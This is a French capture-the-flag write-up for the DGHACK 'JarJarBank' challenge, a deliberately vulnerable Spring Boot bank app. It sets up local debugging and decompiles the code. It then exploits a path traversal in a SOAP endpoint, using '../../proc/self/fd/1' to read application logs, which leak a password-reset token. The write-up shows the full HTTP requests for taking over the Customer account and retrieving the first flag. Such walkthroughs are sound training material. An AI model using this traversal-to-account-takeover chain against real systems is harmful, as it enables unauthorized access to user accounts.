# JarJarBank

### Description

Jarjar Bink était le directeur de la Banque Galactique, une institution financière qui gérait les transactions et crédits entre les différentes planètes de la République.

Il était fier de son travail et de sa réputation de banquier honnête et compétent.

Mais un jour, il reçut un message urgent de son assistant, qui lui annonçait qu'un pirate informatique avait réussi à s'introduire dans le système de sécurité de la banque et à détourner des millions de crédits vers un compte anonyme. Jarjar Bink était sous le choc. Comment cela avait-il pu arriver ? Qui était ce pirate ? Et comment allait-il récupérer l'argent volé ?

Il décida de mener l'enquête lui-même, en utilisant ses contacts et ses ressources. Il découvrit bientôt que le pirate n'était autre que son ancien rival, le comte Dooku, un ancien Jedi qui avait rejoint le côté obscur de la Force et qui cherchait à financer la Confédération des Systèmes Indépendants, une organisation séparatiste qui menaçait la paix dans la galaxie.

> Votre mission jeune padawan est la suivante : auditer la JarJarBank, trouver les failles que le comte Dooku a pu exploiter afin que JarJar puisse les corriger et qu'il remette de l'ordre dans la banque intergalactique !

### Accès à l'épreuve

http://jarjarbank.chall.malicecyber.com/

### Fichiers joints

* [JarJarBank.zip](JarJarBank.zip)

----

:warning: La solution proposée est partielle : elle permet uniquement de récupérer le premier des deux flags.

----

### 0. Installation d'un environnement en local

Le ZIP fourni en pièce jointe contient tous les éléments permettant de lancer le challenge en local.

On va ainsi pouvoir analyser le comportement de l'application et identifier des failles, avant de les exploiter sur le serveur cible.

On valorise les variables présentes dans le fichier `.env` par exemple comme suit :
```env
DB_NAME=JarJarBank
DB_HOST=127.0.0.1
MYSQL_USER=mysqluser
MYSQL_PASSWORD=mysqlpassword
MYSQL_ROOT_PASSWORD=rootpassword

JWT_KEY=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

ADMIN_EMAIL=admin@test.com
ADMIN_PASSWORD=adminpassword
SUPPORT_EMAIL=support@test.com
SUPPORT_PASSWORD=supportpassword
CUSTOMER_EMAIL=customer@test.com
CUSTOMER_PASSWORD=customerpassword

FIRST_FLAG=DGHACK{GRAB_ME_ON_TARGET}
```

On complète légèrement le fichier `docker-compose.yml` afin de pouvoir faire du remote debug :
```diff
    ...
    ports:
      - 8080:8080
+     - 8000:8000
    environment:
+     - JDK_JAVA_OPTIONS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8000
      - DB_NAME=${DB_NAME}
      ...
```

L'application peut ensuite être lancée via un simple `docker-compose up`

Pour pouvoir faire du remote debug, on se munit d'un IDE avec le code "source" de l'application.

Pour ma part, j'ai utilisé Eclipse avec la configuration suivante :

* Plugin de décompilation Java : Enhanced Class Decompiler installé via le Marketplace, avec JD-Core comme Decompiler par défaut. L'article suivant fournit les principales étapes à suivre pour l'installation et la configuration du plugin : https://mkyong.com/java/java-decompiler-plugin-for-eclipse/

* Création d'un projet JAVA :
    - sans source
    - contenu du répertoire JarJarBank-1.0.jar\BOOT-INF\classes\ (après l'avoir extrait) ajouté dans le classpath

* Configuration du remote debugging sur localhost:8000

----

### 1. Identification du endpoint à cibler

L'application est une application Spring Boot.

Elle est sécurisée via Spring security, dont la configuration est précisée via la méthode : `com.dghack.jarjarbank.security.MultiHttpSecurityConfig.apiFilterChain(HttpSecurity, Builder)`

3 types d'accès sont possibles : IHM, API REST, Web Service SOAP

Les Controller liés à l'IHM sont positionnés dans le package `com.dghack.jarjarbank.controller.v1.ui`. L'accès est controlé par le filtre `MaintenanceFilter`. L'application étant en mode maintenance (`application.mode=MAINTENANCE` au niveau du fichier `application.yml`) les requêtes sont redirigées vers la page `maintenance.htlml`. Cet accès n'est donc pas utilisable.

Les API REST sont positionnées dans le package `com.dghack.jarjarbank.controller.v1.api`. Parmi celles-ci on identifie une ressource intéressante : `/api/v1/flag/getFirstFlag` fournie par `FlagRestController` :
```java
@RestController
@RequestMapping({"/api/v1/flag"})
public class FlagRestController {
  private static final Logger LOGGER = LoggerFactory.getLogger(FlagRestController.class);
  
  @Autowired
  private MessageSource messages;
  
  @Value("${application.firstFlag}")
  private String firstFlag;
  
  @GetMapping({"/getFirstFlag"})
  public ResponseEntity<?> getFirstFlag(HttpServletRequest request) {
    return new ResponseEntity(new MessageResponse(
          
          String.format(this.messages.getMessage("message.firstFlag", null, request.getLocale()), new Object[] { this.firstFlag })), (HttpStatusCode)HttpStatus.OK);
  }
}
```

NB : `application.firstFlag` est valorisé avec la variable d'environnement `FIRST_FLAG` définie dans le fichier `.env`

D'après la configuration de sécurité, l'accès à cette ressource nécessite uniquement d'être authentifié.

----

### 2. Configuration des comptes utilisateurs

Malheureusement à ce stade, nous ne disposons pas de compte utilisateur : ceux-ci sont définis via le fichier `.env`.

Au démarrage de l'application, ils sont créés dans la base (cf. méthode `com.dghack.jarjarbank.JarJarBank.commandLineRunner(AuthenticationService)`)

On note néanmoins, que le compte `Customer` est un peu différent des autres. En effet au lieu d'utiliser la variable d'environnement `CUSTOMER_EMAIL` définie dans le fichier `.env` pour définir son `email`, celui-ci est hardcodé en `DGHACKCustomerUser@dghack.fr`.

----

### 3. Analyse de l'API REST non sécurisée

Si on examine les règles de sécurité définies, on constate que seules 3 ressources de l'API sont en accès libre :
- /api/v1/auth/**
- /api/v1/user/resetPassword
- /api/v1/user/savePassword

On examine les possibilités de chacune d'elles.

`/api/v1/auth/authenticate` :
- elle est implémentée par la méthode `com.dghack.jarjarbank.controller.v1.api.AuthenticationController.authenticate(AuthenticationRequest)`
- elle permet de s'authentifier
- en entrée, il faut fournir l'email et le mot de passe d'un compte utilisateur existant
- en retour, on récupère alors un token JWT utilisable comme preuve d'authentification pour d'ultérieurs appels d'API (par exemple à `/api/v1/flag/getFirstFlag`)

`/api/v1/user/resetPassword` :
- elle est implémentée par la méthode `com.dghack.jarjarbank.controller.v1.api.UserRestController.resetPassword(HttpServletRequest, String)`
- elle permet d'initier une procédure de réinitialisation du mot de passe d'un compte
- en entrée, il faut fournir l'email du compte pour lequel on souhaite réinitialiser le mot de passe
- en retour, on récupère uniquement un message rendant compte du succès ou de l'échec de la prise en compte de la demande.
- à noter que l'email fourni en entrée doit correspondre à un compte utilisateur existant, n'ayant le rôle ni Admin, ni Support.
- si l'email est valide, un token de réinitialisation est généré, enregistré en base (associé au compte qui en a fait la demande) et tracé dans la log (en criticité INFO). Dans une version réaliste, le token généré serait transmis par mail à l'utilisateur.
- exemple de trace produite :
  > ```java
  > JarJarBank  | 2023-11-24T22:16:36.459Z  INFO 1 --- [nio-8080-exec-8] c.d.j.c.v1.api.UserRestController        : Reset password token 'qD4iTfLND3pr8VEi2Kpgc8dVOx1kGfct' created for user 'User {id=3, email='DGHACKCustomerUser@dghack.fr', firstName='Customer', lastName='User', mobileNumber='null', roles=CUSTOMER}'
  > ```
- à noter que le token est valide 1440 minutes (soit 24 heures)

`/api/v1/user/savePassword` :
- elle est implémentée par la méthode `com.dghack.jarjarbank.controller.v1.api.UserRestController.savePassword(HttpServletRequest, NewPasswordRequest)`
- elle permet la réinitialisation du mot de passe
- en entrée, il faut fournir un token de réinitialisation (ie celui obtenu par mail suite à l'appel préalable de `/api/v1/user/resetPassword`) et le nouveau mot de passe qu'on souhaite utiliser
- en retour, on récupère uniquement un message rendant compte du succès ou de l'échec de la prise en compte du nouveau mot de passe
- le token fourni doit exister (ie correspondre à une demande de réinitilisation préalable) et être encore valide (ie non expiré)

----

### 4. Analyse du Web Service SOAP

La configuration du WS est définie dans la classe `com.dghack.jarjarbank.config.WebServiceConfig.class`, et les implémentations sont localisées dans le package `com.dghack.jarjarbank.controller.v1.webservices.soap`

Le endpoint est défini ainsi :
```java
@Endpoint
public class ManagementEndpoint {
  private static final String NAMESPACE_URI = "http://www.jarjarbank.dghack.fr/xml/";
  
  final ArrayList<String> listAllowedExtensions = new ArrayList<>(Arrays.asList(new String[] { "xml", "json", "pdf", "docx", "doc" }));
  
  @Value("${application.transactionFolder}")
  private String transactionFolder;
  
  @PayloadRoot(namespace = "http://www.jarjarbank.dghack.fr/xml/", localPart = "transactionRequest")
  @ResponsePayload
  public TransactionResponse getTransactionFile(@RequestPayload TransactionRequest request) {
    FileManager fileManager = new FileManager(this.transactionFolder + request.transactionFile, this.listAllowedExtensions);
    String transactionContent = fileManager.readFileContent();
    TransactionResponse response = new TransactionResponse();
    response.setTransactionData(transactionContent);
    return response;
  }
}
```

Le WS permet de lire le contenu du fichier, localisé dans le répertoire `/app/transactions/` (défini via la propriété `application.transactionFolder` du fichier `application.yml`).

C'est la méthode `com.dghack.jarjarbank.security.FileManager.readFileContent()` qui pilote la logique du traitement de lecture :
- normalisation du chemin du fichier
- suppression du chemin des caractères autres que `[a-zA-Z0-9/.]`
- vérification que le nom du fichier fini par, soit un chiffre sans extension, soit un chiffre avec une extension parmi celles définies dans `ManagementEndpoint.listAllowedExtensions`
- récupération du contenu du fichier

Parmi tous ces contrôles, aucun empêche de réaliser un "Path Traversal".

Il est donc possible d'exploiter ce WS pour lire le contenu de n'importe quel fichier accessible en lecture (vis-à-vis des droits du compte `challenge` utilisé pour démarrer l'application), respectant les critères de nommage ci-dessus.

Parmi les candidats, il y a le "fichier" `/proc/self/fd/1` qui correspond au file descriptor de la sortie standard du processus courant. On va y trouver toutes les traces produites par les `LOGGER` de l'application.

----

### 5. Récupération du 1er flag

__Etape 1 :__ Mise en écoute de la sortie standard, en appelant le WS SOAP

```http
POST http://jarjarbank.chall.malicecyber.com/service/ HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://www.jarjarbank.dghack.fr/xml/">
   <soapenv:Header/>
   <soapenv:Body>
      <gs:transactionRequest targetNamespace="http://www.jarjarbank.dghack.fr/xml/">
     <transactionFile>../../proc/self/fd/1</transactionFile>
      </gs:transactionRequest>
   </soapenv:Body>
</soapenv:Envelope>
```

__Etape 2 :__ Demande de réinitialisation du mot de passe du compte `Customer` : 

```http
POST http://jarjarbank.chall.malicecyber.com/api/v1/user/resetPassword?email=DGHACKCustomerUser@dghack.fr HTTP/1.1
```

La réponse est alors la suivante :
```json
{
  "message": "You should receive a Password Reset Email shortly"
}
```

Cela débloque également l'appel WS pour lequel on obtient la valeur du token de réinitialisation dans la réponse :
```xml
<SOAP-ENV:Envelope 
  xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Header/>
  <SOAP-ENV:Body>
    <ns3:transactionResponse 
      xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/">
      <transactionData>2023-11-24T22:36:14.944Z  INFO 1 --- [io-8080-exec-10] c.d.j.c.v1.api.UserRestController        : Reset password token 'b0edveQXxxPyc9QFYS8YNDG2EpFcUA9g' created for user 'User {id=3, email='DGHACKCustomerUser@dghack.fr', firstName='Customer', lastName='User', mobileNumber='null', roles=CUSTOMER}'
</transactionData>
    </ns3:transactionResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

__Etape 3 :__ Changement du mot de passe du compte `Customer`, en utilisant le token que l'on vient de récupérer.

```http
POST http://jarjarbank.chall.malicecyber.com/api/v1/user/savePassword HTTP/1.1
Content-Type: application/json

{
    "token": "b0edveQXxxPyc9QFYS8YNDG2EpFcUA9g",
    "newPassword": "toto"
}
```

La réponse confirme la prise en compte de ce nouveau mot de passe :
```json
{
  "message": "Password reset successfully"
}
```

__Etape 4 :__ Authentification en tant que `Customer`, en utilisant le nouveau mot de passe.

```http
POST http://jarjarbank.chall.malicecyber.com/api/v1/auth/authenticate HTTP/1.1
Content-Type: application/json

{
    "email": "DGHACKCustomerUser@dghack.fr",
    "password": "toto"
}
```

La réponse contient en retour, un token JWT :
```json
{
  "headers": {},
  "body": {
    "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJER0hBQ0tDdXN0b21lclVzZXJAZGdoYWNrLmZyIiwiaWF0IjoxNzAwODY1NzM1LCJleHAiOjE3MDA4NjkzMzV9.6PrxSrf01hHDq18xg8hUGRRlbKU45b1k32bBEYaci0Q",
    "type": "Bearer",
    "id": 3,
    "email": "DGHACKCustomerUser@dghack.fr"
  },
  "statusCode": "OK",
  "statusCodeValue": 200
}
```

__Etape 5 :__ Récupération du 1er flag

```http
GET /api/v1/flag/getFirstFlag HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJER0hBQ0tDdXN0b21lclVzZXJAZGdoYWNrLmZyIiwiaWF0IjoxNzAwODY1NzM1LCJleHAiOjE3MDA4NjkzMzV9.6PrxSrf01hHDq18xg8hUGRRlbKU45b1k32bBEYaci0Q
```

La réponse contient le flag :
```json
{
  "message": "Congratz ! Here is your first flag: DGHACK{F1l3_r34d_l0gs_t0_4cc0unt_t4k30v3r}. Keep digging and you'll find another flag :)"
}
```

Le 1er flag est donc : `DGHACK{F1l3_r34d_l0gs_t0_4cc0unt_t4k30v3r}`
